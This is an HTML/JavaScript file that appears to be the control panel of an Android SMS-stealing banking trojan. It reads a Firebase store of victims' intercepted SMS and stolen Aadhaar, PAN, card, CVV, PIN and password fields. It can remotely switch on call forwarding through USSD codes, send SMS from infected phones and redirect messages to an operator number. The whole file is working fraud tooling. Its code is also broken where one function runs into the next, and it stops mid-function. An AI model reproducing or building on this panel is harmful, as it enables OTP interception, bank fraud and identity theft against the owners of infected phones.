<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>CSC Monitor</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh;}
#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
.sc{background:#fff;border-radius:20px;padding:28px 20px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.3);}
.logo{text-align:center;margin-bottom:20px;}
.logo h1{font-size:20px;font-weight:700;color:#5b21b6;margin-top:6px;}
.logo p{font-size:12px;color:#64748b;margin-top:3px;}
.fg{margin-bottom:12px;}
.fg label{display:block;font-size:11px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px;}
.fg input{width:100%;border:1.5px solid #e2e8f0;border-radius:10px;padding:11px 13px;font-size:14px;outline:none;font-family:inherit;}
.fg input:focus{border-color:#7c3aed;}
.fg input::placeholder{color:#94a3b8;}
.pbtn{width:100%;background:linear-gradient(135deg,#5b21b6,#7c3aed);color:#fff;border:none;border-radius:10px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px;font-family:inherit;}
.pbtn:disabled{opacity:.5;cursor:not-allowed;}
.errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
.topbar{background:linear-gradient(135deg,#5b21b6,#7c3aed);padding:13px 15px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;box-shadow:0 2px 10px rgba(91,33,182,.4);}
.tb-l{display:flex;align-items:center;gap:8px;color:#fff;font-size:15px;font-weight:700;}
.live-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 8px #4ade80;animation:blink 2s infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
.tb-r{display:flex;gap:7px;}
.xbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;}
#app{display:none;flex-direction:column;min-height:100vh;}
.search-wrap{background:#fff;padding:9px 14px;border-bottom:1px solid #e2e8f0;position:sticky;top:55px;z-index:190;}
.sw{position:relative;}
.sw input{width:100%;border:1.5px solid #e2e8f0;border-radius:10px;padding:9px 34px 9px 36px;font-size:14px;outline:none;font-family:inherit;}
.sw input:focus{border-color:#7c3aed;}
.sw input::placeholder{color:#94a3b8;}
.s-ic{position:absolute;left:11px;top:50%;transform:translateY(-50%);font-size:15px;color:#94a3b8;}
.s-cl{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:14px;color:#94a3b8;cursor:pointer;display:none;}
.reg-bar{background:#fff;padding:7px 14px;border-bottom:1px solid #e2e8f0;font-size:12px;color:#64748b;text-align:center;font-weight:600;}
.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;padding:11px 14px;}
.stat-box{background:#fff;border-radius:12px;padding:13px 8px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.08);}
.stat-n{font-size:26px;font-weight:800;line-height:1;}
.stat-l{font-size:11px;color:#64748b;margin-top:3px;font-weight:600;}
.upd-btn{display:block;margin:2px 14px 10px;width:calc(100% - 28px);background:linear-gradient(135deg,#5b21b6,#7c3aed);color:#fff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;letter-spacing:.8px;cursor:pointer;font-family:inherit;}
.dev-list{padding:0 14px 80px;}
.dev-card{background:#fff;border-radius:14px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden;}
.dev-inner{display:flex;align-items:center;gap:11px;padding:13px 13px 11px;cursor:pointer;}
.dev-inner:active{opacity:.85;}
.dev-num{font-size:15px;font-weight:700;color:#94a3b8;min-width:22px;}
.dev-img{font-size:36px;}
.dev-info{flex:1;}
.dev-name{font-size:15px;font-weight:700;color:#1e293b;}
.dev-id{font-size:11px;color:#64748b;margin-top:2px;}
.dev-bat{font-size:11px;color:#64748b;margin-top:2px;}
.dev-sms-badge{background:#ede9fe;color:#5b21b6;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px;white-space:nowrap;align-self:flex-start;}
.dev-status-row{display:flex;align-items:center;justify-content:space-between;padding:8px 13px;border-top:1px solid #f1f5f9;}
.st-on{color:#16a34a;font-size:13px;font-weight:700;}
.st-off{color:#dc2626;font-size:13px;font-weight:700;}
.del-dev-btn{background:#fef2f2;border:1px solid #fecaca;color:#dc2626;border-radius:8px;padding:4px 10px;font-size:11px;font-weight:700;cursor:pointer;font-family:inherit;}
#detail-screen{display:none;flex-direction:column;min-height:100vh;}
.d-top{background:linear-gradient(135deg,#5b21b6,#7c3aed);padding:13px 14px;display:flex;align-items:center;gap:11px;position:sticky;top:0;z-index:200;}
.bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:13px;cursor:pointer;font-family:inherit;}
.d-title{color:#fff;font-size:15px;font-weight:700;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.d-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:12px 14px;}
.act-btn{background:linear-gradient(135deg,#5b21b6,#7c3aed);color:#fff;border:none;border-radius:10px;padding:14px 8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;}
.tabs{display:flex;border-bottom:2px solid #e2e8f0;background:#fff;position:sticky;top:55px;z-index:100;}
.tab-btn{flex:1;padding:11px;border:none;background:none;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:all .15s;}
.tab-btn.active{color:#5b21b6;border-bottom:2px solid #5b21b6;}
.tab-btn.inactive{color:#94a3b8;}
.panel{padding:0 14px 80px;}
.panel.hide{display:none;}
.sms-card{background:#fff;border-radius:14px;padding:13px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.08);}
.sms-addr{font-size:13px;font-weight:700;color:#5b21b6;margin-bottom:5px;}
.sms-body{font-size:13px;color:#475569;line-height:1.6;word-break:break-word;}
.sms-time{font-size:11px;color:#94a3b8;text-align:right;margin-top:6px;}
.info-card{background:#fff;border-radius:12px;padding:13px 14px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.08);}
.info-label{font-size:11px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;}
.info-val{font-size:14px;font-weight:600;color:#1e293b;word-break:break-all;}
#search-screen{display:none;flex-direction:column;min-height:100vh;}
.sr-info{padding:8px 14px;font-size:13px;color:#64748b;}
.sr-list{padding:4px 14px 80px;}
.src-card{background:#fff;border-radius:12px;padding:12px 13px;margin-bottom:9px;box-shadow:0 2px 8px rgba(0,0,0,.08);cursor:pointer;}
.src-badge{background:#ede9fe;color:#5b21b6;font-size:11px;font-weight:700;padding:3px 10px;border-radius:18px;display:inline-block;margin-bottom:7px;}
.hl{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;display:none;align-items:flex-end;justify-content:center;}
.dlg{background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:460px;max-height:90vh;overflow-y:auto;animation:up .2s ease;}
@keyframes up{from{transform:translateY(60px);opacity:0;}to{transform:translateY(0);opacity:1;}}
.dlg-hdr{padding:16px 18px;text-align:center;font-size:15px;font-weight:700;color:#fff;background:linear-gradient(135deg,#f87171,#fb923c);}
.dlg-body{padding:16px 16px 28px;}
.di{width:100%;border:1.5px solid #e2e8f0;border-radius:10px;padding:11px 13px;font-size:14px;outline:none;margin-bottom:11px;font-family:inherit;}
.di:focus{border-color:#7c3aed;}
.di::placeholder{color:#94a3b8;}
.dbtn{width:100%;background:linear-gradient(135deg,#5b21b6,#7c3aed);color:#fff;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:9px;font-family:inherit;}
.dbtn-row{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:9px;}
.dbtn-h{background:linear-gradient(135deg,#5b21b6,#7c3aed);color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;}
.dbtn-h.red{background:linear-gradient(135deg,#dc2626,#ef4444);}
.dbtn-cancel{width:100%;background:#f1f5f9;color:#64748b;border:1px solid #e2e8f0;border-radius:10px;padding:12px;font-size:14px;cursor:pointer;font-family:inherit;}
.cf-res{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;padding:9px 12px;border-radius:8px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}
.sim-row{display:flex;align-items:center;gap:11px;border:1.5px solid #e2e8f0;border-radius:10px;padding:11px 13px;margin-bottom:9px;cursor:pointer;}
.sim-row.sel{border-color:#7c3aed;background:#ede9fe;}
.sim-ic{font-size:20px;}
.sim-inf{flex:1;}
.sim-nm{font-size:14px;font-weight:600;}
.sim-no{font-size:12px;color:#64748b;margin-top:2px;}
.sim-rb{width:18px;height:18px;border-radius:50%;border:2px solid #cbd5e1;flex-shrink:0;display:flex;align-items:center;justify-content:center;}
.sim-rb.chk{border-color:#7c3aed;}
.sim-rb.chk::after{content:"";width:9px;height:9px;border-radius:50%;background:#7c3aed;}
.loading{display:flex;align-items:center;justify-content:center;padding:50px 14px;gap:12px;color:#64748b;font-size:14px;}
.spin{width:22px;height:22px;border:2.5px solid #e2e8f0;border-top-color:#7c3aed;border-radius:50%;animation:sp .8s linear infinite;}
@keyframes sp{to{transform:rotate(360deg);}}
.empty{text-align:center;padding:50px 14px;color:#64748b;}
.empty .ei{font-size:40px;margin-bottom:10px;opacity:.5;}
.empty p{font-size:14px;}
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 22px;border-radius:22px;font-size:13px;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s;white-space:nowrap;}
</style>
</head>
<body>

<div id="setup-screen">
  <div class="sc">
    <div class="logo">
      <div style="font-size:52px">&#128225;</div>
      <h1>CSC Monitor</h1>
      <p>Firebase Realtime Database Dashboard</p>
    </div>
    <div class="fg"><label>Firebase Database URL</label>
      <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" autocomplete="off"/></div>
    <div class="fg"><label>API Key</label>
      <input id="cfg-key" type="password" placeholder="AIzaSy..."/></div>
    <div class="fg"><label>Project ID</label>
      <input id="cfg-pid" placeholder="your-project-id" autocomplete="off"/></div>
    <div class="fg"><label>Main Node <span style="font-weight:400;text-transform:none;letter-spacing:0">(default: csc6)</span></label>
      <input id="cfg-node" value="csc6"/></div>
    <button class="pbtn" id="setup-btn" onclick="doSetup()">Connect &amp; Open Dashboard</button>
    <div class="errbox" id="setup-err"></div>
  </div>
</div>

<div id="app">
  <div class="topbar">
    <div class="tb-l"><span class="live-dot"></span> CSC Monitor</div>
    <div class="tb-r">
      <button class="xbtn" onclick="doRefresh()">&#8635; Refresh</button>
      <button class="xbtn" onclick="doLogout()">Logout</button>
    </div>
  </div>
  <div class="search-wrap">
    <div class="sw">
      <span class="s-ic">&#128269;</span>
      <input id="gsearch" placeholder="Search SMS across all devices..." oninput="onSearchInput(this.value)"/>
      <button class="s-cl" id="s-cl" onclick="clearSearch()">&#10005;</button>
    </div>
  </div>
  <div id="main-view">
    <div class="reg-bar" id="reg-bar">Register : &#8212;</div>
    <div class="stats-grid">
      <div class="stat-box"><div class="stat-n" id="st-dev" style="color:#7c3aed">0</div><div class="stat-l">Devices</div></div>
      <div class="stat-box"><div class="stat-n" id="st-on" style="color:#16a34a">0</div><div class="stat-l">Online</div></div>
      <div class="stat-box"><div class="stat-n" id="st-sms" style="color:#ea580c">0</div><div class="stat-l">Total SMS</div></div>
    </div>
    <button class="upd-btn" onclick="openUpdNo()">UPDATE NO</button>
    <div class="dev-list" id="dev-list">
      <div class="loading"><div class="spin"></div>&nbsp;Loading...</div>
    </div>
  </div>
</div>

<div id="detail-screen">
  <div class="d-top">
    <button class="bbtn" onclick="goBack()">&#8592; Back</button>
    <div class="d-title" id="d-title">Device</div>
  </div>
  <div class="d-actions">
    <button class="act-btn" onclick="openCallFwd()">&#128222; CALL FORWADING</button>
    <button class="act-btn" onclick="openSmsSend()">&#9993; SMS SEND</button>
  </div>
  <div class="tabs">
    <button class="tab-btn active" id="tab-sms" onclick="switchTab('sms')">&#128172; SMS</button>
    <button class="tab-btn inactive" id="tab-data" onclick="switchTab('data')">&#128196; DATA</button>
    <button class="tab-btn inactive" id="tab-fwd" onclick="switchTab('fwd')">&#128222; FORWARD</button>
  </div>
  <div class="panel" id="panel-sms"></div>
  <div class="panel hide" id="panel-data"></div>
  <div class="panel hide" id="panel-fwd"></div>
</div>

<div id="search-screen">
  <div class="topbar" style="position:sticky;top:0;z-index:200;">
    <div class="tb-l">&#128269; Search Results</div>
    <div class="tb-r"><button class="xbtn" onclick="clearSearch()">&#8592; Back</button></div>
  </div>
  <div class="sr-info" id="sr-info"></div>
  <div class="sr-list" id="sr-list"></div>
</div>

<!-- Call Forwarding Dialog -->
<div class="overlay" id="dlg-cf">
  <div class="dlg">
    <div class="dlg-hdr">&#128222; Call Forwading</div>
    <div class="dlg-body">
      <div id="sim-list"></div>
      <p style="font-size:12px;color:#64748b;text-align:center;margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;">Forwad To</p>
      <input class="di" id="cf-num" placeholder="Your Number" type="tel"/>
      <div class="dbtn-row">
        <button class="dbtn-h" onclick="doCF('active')">Active</button>
        <button class="dbtn-h red" onclick="doCF('deactive')">Deactive</button>
      </div>
      <button class="dbtn" onclick="doCF('check')">Call Forwading Check</button>
      <div class="cf-res" id="cf-res"></div>
      <button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button>
    </div>
  </div>
</div>

<!-- SMS Send Dialog -->
<div class="overlay" id="dlg-sms">
  <div class="dlg">
    <div class="dlg-hdr">&#9993; Send Sms Customer</div>
    <div class="dlg-body">
      <input class="di" id="sms-to" placeholder="Your Number" type="tel"/>
      <textarea class="di" id="sms-msg" placeholder="Message Box" rows="4" style="resize:none;"></textarea>
      <button class="dbtn" onclick="doSendSms()">Sms Send</button>
      <button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button>
    </div>
  </div>
</div>

<!-- Update No Dialog -->
<div class="overlay" id="dlg-upd">
  <div class="dlg">
    <div class="dlg-hdr">Update Number</div>
    <div class="dlg-body">
      <p style="font-size:13px;color:#64748b;margin-bottom:12px;line-height:1.5;">Yeh number saare devices ke Info mein update hoga. APK is number pe SMS forward karega.</p>
      <input class="di" id="upd-num" placeholder="Your number" type="tel"/>
      <button class="dbtn" onclick="doUpdateNo()">UPDATE</button>
      <button class="dbtn-cancel" onclick="closeDialog('dlg-upd')">Cancel</button>
    </div>
  </div>
</div>

<div id="toast"></div>

<script>
/* ================================================================
   FIREBASE STRUCTURE (confirmed from screenshots + APK analysis):
   csc6/
     Admin_Password: "311025"
     All_User/
       Info/
         <deviceKey>/ { Battery, Id, Name, did, status }
       Sms/
         <deviceKey>/
           <smsNum>/ { date, msg, ph }
       SimINFO/
         <deviceKey>/ { dualSim, sim1, sim2, subID1 }
       Call_For/
         <deviceKey>/ { PhoneNumber, Status:"Active"/"DeActive", SubID, Type }
       Data/
         <deviceKey>/ { Aadhaar, Dob, Name, Number, PanCard, Cvv, Card, Expiry, Pin, Pass, CustID }
       Forwad_Status/
         <deviceKey>: "No"/"Yes" (string)
       UpdateNo: "number"  <- write here to update all devices' forward number
       User/
         <deviceKey>/ { id }
   Verify_Device/
     <deviceKey>/ { ... }

   APK CALL FORWARDING (from call_forwading.xml):
   - SIM-1 / SIM-2 radio buttons
   - "Forwad To" + "Your Number" input
   - Active button -> writes {PhoneNumber, Status:"Active", SubID, Type:"Active"}
   - Deactive button -> writes {Status:"DeActive"}
   - "Call Forwading Check" -> reads Call_For/<deviceKey>

   APK SMS SEND (from smssend_layout.xml):
   - "Your Number" + "Message Box"
   - "Sms Send" -> writes to SendSms/<deviceKey>/{ph, msg, date}
   - APK reads this node and sends actual SMS

   APK UPDATE NO (from numberupdate.xml):
   - writes to All_User/Info/<deviceKey>/Number for ALL devices
   - APK reads Number from Info and forwards SMS there

   ALL DELETE (from APK string "All Delete User"):
   - Deletes device from Info/<deviceKey>
================================================================ */

var DB='', KEY='', NODE='csc6';
var DEVS={}, CUR=null, SEL_SIM=0, TTIMER=null, POLL=null;
var ALL_SMS_LOADED=false;

function fbUrl(path) {
  var u = DB+'/'+path+'.json';
  if (KEY) u += '?auth='+encodeURIComponent(KEY);
  return u;
}
function fbGet(path) {
  var ctrl = window.AbortController ? new AbortController() : null;
  var t;
  var p = fetch(fbUrl(path), ctrl ? {signal:ctrl.signal} : {})
    .then(function(r){clearTimeout(t);return r.json();});
  if (ctrl) t = setTimeout(function(){ctrl.abort();}, 12000);
  return p;
}
function fbSet(path, val) {
  return fetch(fbUrl(path), {
    method:'PUT',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(val)
  }).then(function(r){return r.json();});
}
function fbDel(path) {
  return fetch(fbUrl(path), {method:'DELETE'}).then(function(r){return r.json();});
}

/* ---- SETUP ---- */
function doSetup() {
  var u=(document.getElementById('cfg-url').value||'').trim().replace(/\/+$/,'');
  var k=(document.getElementById('cfg-key').value||'').trim();
  var p=(document.getElementById('cfg-pid').value||'').trim();
  var n=(document.getElementById('cfg-node').value||'').trim();
  document.getElementById('setup-err').style.display='none';
  if (!u){setErr('Firebase URL daalo!');return;}
  if (!p){setErr('Project ID daalo!');return;}
  DB=u; KEY=k; NODE=n||'csc6';
  var btn=document.getElementById('setup-btn');
  btn.disabled=true; btn.textContent='Connecting...';
  var timed=false;
  var tout=setTimeout(function(){
    timed=true;
    setErr('Timeout! Database Rules check karo.');
    btn.disabled=false; btn.textContent='Connect & Open Dashboard';
  }, 9000);
  fetch(fbUrl(NODE+'/All_User/Info'))
    .then(function(r){return r.json();})
    .then(function(data){
      if (timed) return;
      clearTimeout(tout);
      if (data && data.error){
        setErr('Firebase Error: '+data.error);
        btn.disabled=false; btn.textContent='Connect & Open Dashboard';
        return;
      }
      btn.disabled=false;
      launchApp(data);
    })
    .catch(function(){
      if (timed) return;
      clearTimeout(tout);
      btn.disabled=false;
      launchApp(null);
    });
}
function setErr(m){var e=document.getElementById('setup-err');e.textContent=m;e.style.display='block';}

function launchApp(infoData) {
  document.getElementById('setup-screen').style.display='none';
  var a=document.getElementById('app');
  a.style.display='flex'; a.style.flexDirection='column';
  if (infoData) buildFromInfo(infoData);
  else document.getElementById('dev-list').innerHTML='<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
  loadSmsData();
  startPolling();
}
function doLogout() {
  stopPolling();
  ['app','detail-screen','search-screen'].forEach(function(id){document.getElementById(id).style.display='none';});
  document.getElementById('setup-screen').style.display='flex';
  var btn=document.getElementById('setup-btn');
  btn.disabled=false; btn.textContent='Connect & Open Dashboard';
  DEVS={}; CUR=null; ALL_SMS_LOADED=false;
}

/* ---- POLLING every 5s ---- */
function startPolling(){stopPolling();POLL=setInterval(loadAllData,5000);}
function stopPolling(){if(POLL){clearInterval(POLL);POLL=null;}}
function doRefresh(){showToast('Refreshing...');loadAllData();}

function loadAllData() {
  fbGet(NODE+'/All_User/Info').then(function(d){
    if(d&&!d.error) buildFromInfo(d);
  }).catch(function(){});
}

function loadSmsData() {
  fbGet(NODE+'/All_User/Sms').then(function(smsData){
    if(!smsData||smsData.error) return;
    ALL_SMS_LOADED=true;
    var devKeys=Object.keys(smsData);
    for(var i=0;i<devKeys.length;i++){
      var k=devKeys[i];
      var devSms=smsData[k];
      var arr=[];
      if(devSms&&typeof devSms==='object'){
        var nums=Object.keys(devSms);
        for(var j=0;j<nums.length;j++){
          var s=devSms[nums[j]];
          if(s&&typeof s==='object'){s._key=nums[j];arr.push(s);}
        }
      }
      if(DEVS[k]) DEVS[k].sms=arr;
      else DEVS[k]={key:k,name:k,id:k,bat:'',on:false,sms:arr,sim:{}};
    }
    updateSmsCount();
    renderDevList();
    if(CUR&&document.getElementById('detail-screen').style.display==='flex') renderSmsTab(CUR);
  }).catch(function(){});
}

/* ---- BUILD DEVICES FROM INFO ---- */
/* Info/<deviceKey>/ { Battery, Id, Name, did, status } */
function buildFromInfo(infoData) {
  if(!infoData||typeof infoData!=='object') return;
  var keys=Object.keys(infoData);
  var online=0, total=0;
  for(var i=0;i<keys.length;i++){
    var k=keys[i];
    var info=infoData[k];
    if(!info||typeof info!=='object') continue;
    var st=String(info.status||info.Status||'').toLowerCase();
    var isOn=(st==='online');
    if(isOn) online++;
    total++;
    var existSms=(DEVS[k]&&DEVS[k].sms)?DEVS[k].sms:[];
    var existSim=(DEVS[k]&&DEVS[k].sim)?DEVS[k].sim:{};
    DEVS[k]={
      key:k,
      name:info.Name||info.name||k,
      id:info.Id||info.id||info.did||k,
      bat:info.Battery||info.battery||'',
      on:isOn,
      sms:existSms,
      sim:existSim
    };
  }
  document.getElementById('st-dev').textContent=total;
  document.getElementById('st-on').textContent=online;
  updateSmsCount();
  renderDevList();
  if(CUR&&document.getElementById('detail-screen').style.display==='flex') renderSmsTab(CUR);
  var q=(document.getElementById('gsearch').value||'').trim();
  if(q&&document.getElementById('search-screen').style.display==='flex') runSearch(q);
}

function updateSmsCount(){
  var t=0,devs=Object.values(DEVS);
  for(var i=0;i<devs.length;i++) t+=devs[i].sms.length;
  document.getElementById('st-sms').textContent=t;
}

/* ---- RENDER DEVICE LIST ---- */
function renderDevList(){
  var el=document.getElementById('dev-list');
  var devs=Object.values(DEVS);
  if(!devs.length){el.innerHTML='<div class="empty"><div class="ei">&#128241;</div><p>Koi device nahi mila</p></div>';return;}
  el.innerHTML='';
  var frag=document.createDocumentFragment();
  for(var i=0;i<devs.length;i++){
    var d=devs[i];
    var card=document.createElement('div');
    card.className='dev-card';
    /* Inner clickable area */
    var inner=document.createElement('div');
    inner.className='dev-inner';
    inner.innerHTML=
      '<div class="dev-num">'+(i+1)+'</div>'+
      '<div class="dev-img">&#128241;</div>'+
      '<div class="dev-info">'+
        '<div class="dev-name">Mobile : '+eh(d.name)+'</div>'+
        '<div class="dev-id">Device Id : '+eh(d.id)+'</div>'+
        (d.bat?'<div class="dev-bat">Battery : '+eh(String(d.bat))+'%</div>':'')+
      '</div>'+
      '<div class="dev-sms-badge">SMS: '+d.sms.length+'</div>';
    (function(key){
      inner.addEventListener('click',function(){openDevice(key);});
    })(d.key);
    card.appendChild(inner);
    /* Status + delete row */
    var statusRow=document.createElement('div');
    statusRow.className='dev-status-row';
    var statusTxt=document.createElement('span');
    statusTxt.className=d.on?'st-on':'st-off';
    statusTxt.textContent='Status : '+(d.on?'Online User':'Offline User');
    statusRow.appendChild(statusTxt);

    var delBtn=document.createElement('button');
    delBtn.className='del-dev-btn';
    delBtn.textContent='Delete';
    (function(key, btn){
      btn.addEventListener('click',function(e){
        e.stopPropagation();
        deleteDevice(key, btn);
      });
    })(d.key, delBtn);
    statusRow.appendChild(delBtn);
    card.appendChild(statusRow);
    frag.appendChild(card);
  }

/* ---- DELETE DEVICE ---- */
/* Deletes from Info/<deviceKey> - if device comes back online, it re-appears */
function deleteDevice(key, btn) {
  if(!confirm('Device delete karo? Wapas online aane pe auto restore hoga.')) return;
  btn.textContent='...'; btn.disabled=true;
  fbDel(NODE+'/All_User/Info/'+key)
    .then(function(){
      delete DEVS[key];
      var total=Object.keys(DEVS).length;
      document.getElementById('st-dev').textContent=total;
      updateSmsCount();
      renderDevList();
      showToast('Device deleted!');
    })
    .catch(function(){
      btn.textContent='Delete'; btn.disabled=false;
      showToast('Delete fail!');
    });
}

/* ---- OPEN DEVICE ---- */
function openDevice(key){
  CUR=key;
  document.getElementById('app').style.display='none';
  document.getElementById('search-screen').style.display='none';
  var ds=document.getElementById('detail-screen');
  ds.style.display='flex'; ds.style.flexDirection='column';
  document.getElementById('d-title').textContent=DEVS[key]?DEVS[key].name:key;
  switchTab('sms');
  /* Fetch fresh SMS for this device */
  fetchDeviceSms(key);
  /* Load SIM info */
  fbGet(NODE+'/All_User/SimINFO/'+key).then(function(sim){
    if(sim&&!sim.error&&DEVS[key]) DEVS[key].sim=sim;
  }).catch(function(){});
  window.scrollTo(0,0);
}

/* Fetch fresh SMS for one device */
function fetchDeviceSms(key){
  fbGet(NODE+'/All_User/Sms/'+key).then(function(smsData){
    if(!smsData||smsData.error) return;
    var arr=[];
    if(typeof smsData==='object'){
      var nums=Object.keys(smsData);
      for(var j=0;j<nums.length;j++){
        var s=smsData[nums[j]];
        if(s&&typeof s==='object'){s._key=nums[j];arr.push(s);}
      }
    }
    if(DEVS[key]){
      DEVS[key].sms=arr;
      updateSmsCount();
      renderDevList();
      if(CUR===key) renderSmsTab(key);
    }
  }).catch(function(){});
}

/* ---- TABS ---- */
function switchTab(tab){
  var tabs=['sms','data','fwd'];
  for(var i=0;i<tabs.length;i++){
    var t=tabs[i];
    var btn=document.getElementById('tab-'+t);
    var panel=document.getElementById('panel-'+t);
    if(t===tab){btn.className='tab-btn active';panel.className='panel';}
    else{btn.className='tab-btn inactive';panel.className='panel hide';}
  }
  if(tab==='sms') renderSmsTab(CUR);
  else if(tab==='data') loadDataTab(CUR);
  else if(tab==='fwd') loadFwdTab(CUR);
}

/* ---- SMS TAB ---- */
function renderSmsTab(key){
  var d=DEVS[key];
  var el=document.getElementById('panel-sms');
  if(!d){el.innerHTML='<div class="empty"><div class="ei">&#128172;</div><p>Data nahi mila</p></div>';return;}
  var sms=d.sms.slice().sort(function(a,b){return getTs(b)-getTs(a);});
  if(!sms.length){el.innerHTML='<div class="empty"><div class="ei">&#128172;</div><p>Koi SMS nahi mila</p></div>';return;}
  el.innerHTML='';
  var frag=document.createDocumentFragment();
  for(var i=0;i<sms.length;i++){
    var s=sms[i];
    /* APK SMS fields: ph (sender), msg (body), date (timestamp) */
    var addr=s.ph||s.address||s.Address||s.sender||s.from||s.number||'-';
    var body=s.msg||s.body||s.Body||s.message||s.text||'-';
    var t=s.date||s.Date||s.timestamp||s.time||'';
    var skey=s._key||'';
    var card=document.createElement('div');
    card.className='sms-card';
    var row=document.createElement('div');
    row.style.cssText='display:flex;align-items:flex-start;justify-content:space-between;gap:8px;';
    var left=document.createElement('div');
    left.style.flex='1';
    var aEl=document.createElement('div'); aEl.className='sms-addr'; aEl.textContent='Address : '+String(addr);
    var bEl=document.createElement('div'); bEl.className='sms-body'; bEl.textContent=String(body);
    var tEl=document.createElement('div'); tEl.className='sms-time'; tEl.textContent=fmtDate(t);
    left.appendChild(aEl); left.appendChild(bEl); left.appendChild(tEl);
    row.appendChild(left);
    if(skey){
      var dBtn=document.createElement('button');
      dBtn.textContent='DEL';
      dBtn.style.cssText='background:#fef2f2;border:1px solid #fecaca;color:#dc2626;border-radius:8px;padding:5px 9px;font-size:11px;cursor:pointer;flex-shrink:0;font-family:inherit;font-weight:700;';
      (function(dk,sk,b){
        b.addEventListener('click',function(){delSms(dk,sk,b);});
      })(key,skey,dBtn);
      row.appendChild(dBtn);
    }
    card.appendChild(row);
    frag.appendChild(card);
  }
  el.appendChild(frag);
}

/* Delete SMS from Firebase */
function delSms(devKey,smsKey,btn){
  if(!confirm('SMS delete karo?')) return;
  btn.textContent='...'; btn.disabled=true;
  fbDel(NODE+'/All_User/Sms/'+devKey+'/'+smsKey)
    .then(function(){
      if(DEVS[devKey]) DEVS[devKey].sms=DEVS[devKey].sms.filter(function(s){return s._key!==smsKey;});
      updateSmsCount();
      renderDevList();
      renderSmsTab(devKey);
      showToast('SMS deleted!');
    })
    .catch(function(){btn.textContent='DEL';btn.disabled=false;showToast('Delete fail!');});
}

/* ---- CALL FORWARDING ---- */
/* APK uses USSD: **21*<number># to activate, ##21# to deactivate */
/* Also writes to Firebase: Call_For/<deviceKey>/{PhoneNumber, Status, SubID, Type} */
function openCallFwd(){
  var d=DEVS[CUR]; if(!d) return;
  var sim=d.sim||{};
  var sim1=sim.sim1||'Not available';
  var sim2=sim.sim2||'Not available';
  var html='';
  html+='<div class="sim-row sel" data-s="0"><div class="sim-ic">&#128246;</div>';
  html+='<div class="sim-inf"><div class="sim-nm">SIM - 1</div><div class="sim-no">'+eh(sim1)+'</div></div>';
  html+='<div class="sim-rb chk"></div></div>';
  html+='<div class="sim-row" data-s="1"><div class="sim-ic">&#128246;</div>';
  html+='<div class="sim-inf"><div class="sim-nm">SIM - 2</div><div class="sim-no">'+eh(sim2)+'</div></div>';
  html+='<div class="sim-rb"></div></div>';
  document.getElementById('sim-list').innerHTML=html;
  /* Add click handlers after innerHTML */
  var rows=document.querySelectorAll('#sim-list .sim-row');
  for(var i=0;i<rows.length;i++){
    (function(row,idx){row.addEventListener('click',function(){selSim(idx);});})(rows[i],i);
  }
  SEL_SIM=0;
  document.getElementById('cf-res').style.display='none';
  document.getElementById('cf-num').value='';
  openDialog('dlg-cf');
}

function selSim(idx){
  SEL_SIM=idx;
  var rows=document.querySelectorAll('#sim-list .sim-row');
  for(var i=0;i<rows.length;i++){
    var on=(i===idx);
    if(on)rows[i].classList.add('sel'); else rows[i].classList.remove('sel');
    var rb=rows[i].querySelector('.sim-rb');
    if(rb){if(on)rb.classList.add('chk');else rb.classList.remove('chk');}
  }
}

function doCF(action){
  var num=document.getElementById('cf-num').value.trim();
  if(action!=='check'&&!num){showToast('Number daalo!');return;}
  if(action==='check'){
    fbGet(NODE+'/All_User/Call_For/'+CUR).then(function(d){
